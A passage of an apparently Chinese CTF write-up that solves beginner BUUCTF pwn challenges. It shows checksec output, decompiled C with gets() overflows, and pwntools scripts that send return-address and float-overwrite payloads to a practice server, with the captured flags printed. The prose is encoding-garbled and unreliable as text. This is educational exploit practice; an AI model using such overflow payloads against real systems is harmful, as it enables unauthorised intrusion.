</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>PS</span> <span class=n>C</span><span class=p>:</span>\<span class=n>Users</span>\<span class=n>root</span><span class=o>&gt;</span> <span class=o>&amp;</span> <span class=s2>&#34;D:/Program Files/python/python.exe&#34;</span> <span class=n>d</span><span class=p>:</span><span class=o>/</span><span class=n>CTF</span><span class=o>/</span><span class=err>é¡¹ç›®</span><span class=o>/</span><span class=n>BUU</span><span class=o>/</span><span class=n>pwn</span><span class=o>/</span><span class=n>rip</span><span class=o>/</span><span class=n>hack</span><span class=o>.</span><span class=n>py</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>x</span><span class=p>]</span> <span class=n>Opening</span> <span class=n>connection</span> <span class=n>to</span> <span class=n>node5</span><span class=o>.</span><span class=n>buuoj</span><span class=o>.</span><span class=n>cn</span> <span class=n>on</span> <span class=n>port</span> <span class=mi>25983</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>x</span><span class=p>]</span> <span class=n>Opening</span> <span class=n>connection</span> <span class=n>to</span> <span class=n>node5</span><span class=o>.</span><span class=n>buuoj</span><span class=o>.</span><span class=n>cn</span> <span class=n>on</span> <span class=n>port</span> <span class=mi>25983</span><span class=p>:</span> <span class=n>Trying</span> <span class=mf>117.21</span><span class=o>.</span><span class=mf>200.176</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Opening</span> <span class=n>connection</span> <span class=n>to</span> <span class=n>node5</span><span class=o>.</span><span class=n>buuoj</span><span class=o>.</span><span class=n>cn</span> <span class=n>on</span> <span class=n>port</span> <span class=mi>25983</span><span class=p>:</span> <span class=n>Done</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Switching</span> <span class=n>to</span> <span class=n>interactive</span> <span class=n>mode</span>
</span></span><span class=line><span class=cl><span class=n>ls</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>bin</span>
</span></span><span class=line><span class=cl><span class=n>boot</span>
</span></span><span class=line><span class=cl><span class=n>dev</span>
</span></span><span class=line><span class=cl><span class=n>etc</span>
</span></span><span class=line><span class=cl><span class=n>flag</span>
</span></span><span class=line><span class=cl><span class=n>home</span>
</span></span><span class=line><span class=cl><span class=o>...</span>
</span></span><span class=line><span class=cl><span class=k>var</span>
</span></span><span class=line><span class=cl><span class=n>cat</span> <span class=n>flag</span>
</span></span><span class=line><span class=cl><span class=n>flag</span><span class=p>{</span><span class=mi>7</span><span class=n>f35d897</span><span class=o>-</span><span class=n>a5fd</span><span class=o>-</span><span class=mi>4505</span><span class=o>-</span><span class=mi>84</span><span class=n>a7</span><span class=o>-</span><span class=mi>2990</span><span class=n>b740f2d9</span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=warmup_csaw_2016>warmup_csaw_2016</h2><p>å…ˆ<code>checksec</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>â¯ checksec --file<span class=o>=</span><span class=s1>&#39;/home/wuko233/Desktop/pwn/warmup_csaw_2016/warmup_csaw_2016&#39;</span>
</span></span><span class=line><span class=cl>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
</span></span><span class=line><span class=cl>Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   No Symbols        No    <span class=m>0</span>               <span class=m>2</span>               /home/wuko233/Desktop/pwn/warmup_csaw_2016/warmup_csaw_2016
</span></span></code></pre></td></tr></table></div></div><p>åˆ†æç¨‹åºï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kr>__int64</span> <span class=kr>__fastcall</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>a1</span><span class=p>,</span> <span class=kt>char</span> <span class=o>**</span><span class=n>a2</span><span class=p>,</span> <span class=kt>char</span> <span class=o>**</span><span class=n>a3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>s</span><span class=p>[</span><span class=mi>64</span><span class=p>];</span> <span class=c1>// [rsp+0h] [rbp-80h] BYREF
</span></span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>v5</span><span class=p>[</span><span class=mi>64</span><span class=p>];</span> <span class=c1>// [rsp+40h] [rbp-40h] BYREF
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s>&#34;-Warm Up-</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=mh>0xAuLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s>&#34;WOW:&#34;</span><span class=p>,</span> <span class=mi>4uLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>sprintf</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=s>&#34;%p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>sub_40060D</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>s</span><span class=p>,</span> <span class=mi>9uLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s>&#34;&gt;&#34;</span><span class=p>,</span> <span class=mi>1uLL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>gets</span><span class=p>(</span><span class=n>v5</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=nf>sub_40060D</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>system</span><span class=p>(</span><span class=s>&#34;cat flag.txt&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>å’Œä¸Šé¢ä¸€é“é¢˜å·®ä¸å¤šï¼Œè¿˜æ˜¯åˆ©ç”¨<code>gets()</code>æº¢å‡ºï¼Œ64+8=72ï¼Œshellcodeæ˜¯<code>sub_40060D</code>ï¼Œåœ°å€å°±ä½äº<code>0x40060D</code>ã€‚</p><p>æ‰€ä»¥ï¼Œpayloadå°±æ˜¯ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;q&#39;</span><span class=o>*</span><span class=mi>72</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x40060D</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>å®Œæ•´ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s2>&#34;node5.buuoj.cn&#34;</span>
</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=mi>29765</span>
</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;q&#39;</span><span class=o>*</span><span class=mi>72</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x40060D</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>ç›´æ¥å¾—åˆ°äº†flagï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[*] Switching to interactive mode
</span></span><span class=line><span class=cl>&gt;flag{110426c9-307c-4a2e-b763-73e47ca4a4fb}
</span></span><span class=line><span class=cl>timeout: the monitored command dumped core
</span></span><span class=line><span class=cl>[*] Got EOF while reading in interactive
</span></span></code></pre></td></tr></table></div></div><p>ä¸è¿‡è¿™é“é¢˜å…¶å®åº”è¯¥ä¸æ˜¯è¿™æ ·åšçš„ã€‚ã€‚å› ä¸ºä¸»å‡½æ•°é‡Œ<code>sprintf(s, "%p\n", sub_40060D)</code>æ˜¯ç”¨æ¥æ‰“å°å‡ºshellcodeå‡½æ•°åœ°å€çš„ï¼Œä¹Ÿå°±æ˜¯æ³„éœ²åœ°å€ï¼Œä½†æ˜¯å®ƒçš„<code>PIE</code>æœªå¯ç”¨ï¼Œä¹Ÿå°±æ˜¯æ¯æ¬¡çš„åœ°å€éƒ½æ˜¯å›ºå®šçš„ï¼Œè¿™ä¸ªè¯­å¥å°±æ¯«æ— æ„ä¹‰äº†ã€‚</p><p>æ‰€ä»¥åº”è¯¥æ˜¯è¿™æ ·çš„ï¼š</p><p><code>PIE</code>å¯ç”¨ï¼Œæ¯æ¬¡è¿è¡Œæ—¶å‡½æ•°åœ°å€éƒ½æ˜¯éšæœºçš„ï¼Œéœ€è¦æ”»å‡»è€…é€šè¿‡<code>sprintf(s, "%p\n", sub_40060D)</code>æ¥è·å–shellcodeå‡½æ•°åœ°å€ï¼Œå†é€šè¿‡<code>gets()</code>æº¢å‡ºè¿›è€Œæ‰§è¡Œshellcodeã€‚</p><p>æŒ‰ç…§è¿™ä¸ªæ€è·¯ï¼Œå†å†™ä¸€ä¸ªè„šæœ¬ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s2>&#34;node5.buuoj.cn&#34;</span>
</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=mi>29765</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;WOW:&#34;</span><span class=p>))</span>  <span class=c1># æ¥æ”¶ç›´åˆ°å‡ºç°&#34;WOW:&#34;</span>
</span></span><span class=line><span class=cl><span class=n>location</span> <span class=o>=</span> <span class=n>sh</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s2>&#34;UTF-8&#34;</span><span class=p>)</span> <span class=c1>#è·å–åˆ°å­—èŠ‚ä¸²ï¼Œè½¬åŒ–ä¸ºå­—ç¬¦ä¸²å¹¶å»é™¤\n</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;å‡½æ•°åœ°å€ï¼š&#34;</span> <span class=o>+</span> <span class=n>location</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>72</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>location</span><span class=p>,</span> <span class=mi>16</span><span class=p>))</span>  <span class=c1>#p64()éœ€ä¼ å…¥intï¼Œæ‰€ä»¥æŠŠåœ°å€å­—ç¬¦ä¸²è½¬æ¢ä¸º16è¿›åˆ¶çš„int</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>å¾—åˆ°flagï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>d</span><span class=p>:</span>\<span class=n>CTF</span>\<span class=err>é¡¹ç›®</span>\<span class=n>BUU</span>\<span class=n>pwn</span>\<span class=n>warmup_csaw_2016</span>\<span class=n>hack</span><span class=o>.</span><span class=n>py</span><span class=p>:</span><span class=mi>7</span><span class=p>:</span> <span class=n>BytesWarning</span><span class=p>:</span> <span class=n>Text</span> <span class=n>is</span> <span class=ow>not</span> <span class=n>bytes</span><span class=p>;</span> <span class=n>assuming</span> <span class=n>ASCII</span><span class=p>,</span> <span class=n>no</span> <span class=n>guarantees</span><span class=o>.</span> <span class=n>See</span> <span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>docs</span><span class=o>.</span><span class=n>pwntools</span><span class=o>.</span><span class=n>com</span><span class=o>/</span><span class=c1>#bytes</span>
</span></span><span class=line><span class=cl>  <span class=nb>print</span><span class=p>(</span><span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;WOW:&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=sa>b</span><span class=s1>&#39;-Warm Up-</span><span class=se>\n</span><span class=s1>WOW:&#39;</span>
</span></span><span class=line><span class=cl><span class=err>å‡½æ•°åœ°å€ï¼š</span><span class=mh>0x40060d</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Switching</span> <span class=n>to</span> <span class=n>interactive</span> <span class=n>mode</span>
</span></span><span class=line><span class=cl><span class=o>&gt;</span><span class=n>flag</span><span class=p>{</span><span class=mi>110426</span><span class=n>c9</span><span class=o>-</span><span class=mi>307</span><span class=n>c</span><span class=o>-</span><span class=mi>4</span><span class=n>a2e</span><span class=o>-</span><span class=n>b763</span><span class=o>-</span><span class=mf>73e47</span><span class=n>ca4a4fb</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>timeout</span><span class=p>:</span> <span class=n>the</span> <span class=n>monitored</span> <span class=n>command</span> <span class=n>dumped</span> <span class=n>core</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Got</span> <span class=n>EOF</span> <span class=k>while</span> <span class=n>reading</span> <span class=ow>in</span> <span class=n>interactive</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Interrupted</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Closed</span> <span class=n>connection</span> <span class=n>to</span> <span class=n>node5</span><span class=o>.</span><span class=n>buuoj</span><span class=o>.</span><span class=n>cn</span> <span class=n>port</span> <span class=mi>29765</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=ciscn_2019_n_1-æ”¹å€¼>ciscn_2019_n_1 ï¼ˆæ”¹å€¼ï¼‰</h2><p>å’Œä¸Šé¢ä¸€æ ·ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
</span></span><span class=line><span class=cl>Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   73 Symbols        No    0               1               /home/wuko233/Desktop/pwn/
</span></span></code></pre></td></tr></table></div></div><p><code>main</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__fastcall</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>setvbuf</span><span class=p>(</span><span class=n>_bss_start</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>setvbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>func</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><code>func</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=kt>int</span> <span class=nf>func</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>v1</span><span class=p>[</span><span class=mi>44</span><span class=p>];</span> <span class=c1>// [rsp+0h] [rbp-30h] BYREF
</span></span></span><span class=line><span class=cl>  <span class=kt>float</span> <span class=n>v2</span><span class=p>;</span> <span class=c1>// [rsp+2Ch] [rbp-4h]
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>v2</span> <span class=o>=</span> <span class=mf>0.0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>puts</span><span class=p>(</span><span class=s>&#34;Let&#39;s guess the number.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>gets</span><span class=p>(</span><span class=n>v1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>v2</span> <span class=o>==</span> <span class=mf>11.28125</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>system</span><span class=p>(</span><span class=s>&#34;cat /flag&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>puts</span><span class=p>(</span><span class=s>&#34;Its value should be 11.28125&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>åˆ†æä¸€ä¸‹ï¼Œshellcodeå¿…é¡»æ»¡è¶³v2å€¼ä¸º11.28125ï¼Œæ‰€ä»¥éœ€è¦é€šè¿‡<code>gets()</code>æº¢å‡ºæ¥æ”¹å˜v2çš„å€¼ã€‚</p><p>æ³¨æ„åˆ°ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>v1</span><span class=p>[</span><span class=mi>44</span><span class=p>];</span> <span class=c1>// [rsp+0h] [rbp-30h] BYREF
</span></span></span><span class=line><span class=cl>  <span class=kt>float</span> <span class=n>v2</span><span class=p>;</span> <span class=c1>// [rsp+2Ch] [rbp-4h]
</span></span></span></code></pre></td></tr></table></div></div><p>åœ¨<code>v1</code>çš„å®šä¹‰ä¸‹å°±æ˜¯<code>v2</code>ï¼Œæ‰€ä»¥å¯ä»¥æº¢å‡ºv1æ¥ä¿®æ”¹v2çš„å€¼ã€‚</p><p>v1é•¿åº¦ä¸º44ï¼Œv2é•¿åº¦ä¸º4(float)ã€‚(byte)</p><p>è¿™é‡Œè¡¥ä¸ªç¬”è®°ï¼Œé•¿åº¦åˆ¤æ–­ä¹Ÿå¯ä»¥é åé¢åç¼–è¯‘çš„æ³¨é‡Šï¼š</p><p>v1èµ·å§‹ç‚¹ï¼š<code>rbp-30h</code></p><p>v2èµ·å§‹ç‚¹ï¼š<code>rbp-4h</code></p><p>æ‰€ä»¥v1é•¿åº¦å°±æ˜¯<code>0x30(48)-0x4(4)=44</code></p><p>æº¢å‡ºv1è¿˜æ˜¯å’Œä¸Šé¢ä¸€æ ·ï¼š<code>'q'*44</code></p><p>æ¥ä¸‹æ¥çš„ä¸»è¦é—®é¢˜æ˜¯ç»™v2èµ‹å€¼11.28125ï¼š</p><p>è‚¯å®šæ˜¯ä¸èƒ½ç›´æ¥ä¼ è¿›è¿™ä¸ªæ•°çš„ï¼Œå› ä¸ºå®ƒæ˜¯æµ®ç‚¹ï¼Œæˆ‘ä»¬éœ€è¦ä¼ å…¥å­—èŠ‚ï¼Œæ‰€ä»¥å¯ä»¥ç”¨<code>struct</code>åº“ï¼š</p><blockquote><p>Struct æ¨¡å—ç”¨äºåœ¨å­—èŠ‚å­—ç¬¦ä¸²å’Œ Python åŸç”Ÿæ•°æ®ç±»å‹ä¹‹é—´è¿›è¡Œè½¬æ¢ã€‚å®ƒå¯ä»¥å°† Python æ•°æ®æ‰“åŒ…æˆäºŒè¿›åˆ¶æ•°æ®ï¼Œæˆ–å°†äºŒè¿›åˆ¶æ•°æ®è§£åŒ…æˆ Python æ•°æ®ã€‚</p></blockquote><blockquote><p>struct.pack() å‡½æ•°å¯ä»¥å°†æ•°æ®æ‰“åŒ…æˆäºŒè¿›åˆ¶æ ¼å¼ã€‚æ ¼å¼å­—ç¬¦ä¸²æŒ‡å®šäº†æ•°æ®çš„ç±»å‹å’Œé¡ºåºã€‚</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>struct</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>num</span> <span class=o>=</span> <span class=mf>11.28125</span>
</span></span><span class=line><span class=cl><span class=n>num2byte</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s2>&#34;f&#34;</span><span class=p>,</span> <span class=n>num</span><span class=p>)</span> <span class=c1># floatç±»å‹è½¬byte</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>num</span><span class=si>}</span><span class=s2> è½¬æ¢ç»“æœï¼š</span><span class=si>{</span><span class=n>num2byte</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 11.28125 è½¬æ¢ç»“æœï¼šb&#39;\x00\x804A&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>ç»¼ä¸Šå¯å¾—payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>num</span> <span class=o>=</span> <span class=mf>11.28125</span>
</span></span><span class=line><span class=cl><span class=n>num2byte</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s2>&#34;f&#34;</span><span class=p>,</span> <span class=n>num</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>num</span><span class=si>}</span><span class=s2> è½¬æ¢ç»“æœï¼š</span><span class=si>{</span><span class=n>num2byte</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;q&#39;</span><span class=o>*</span><span class=mi>44</span> <span class=o>+</span> <span class=n>num2byte</span>
</span></span></code></pre></td></tr></table></div></div><p>æ€»ä½“ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>struct</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s2>&#34;node5.buuoj.cn&#34;</span>
</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=mi>25333</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>num</span> <span class=o>=</span> <span class=mf>11.28125</span>
</span></span><span class=line><span class=cl><span class=n>num2byte</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s2>&#34;f&#34;</span><span class=p>,</span> <span class=n>num</span><span class=p>)</span>
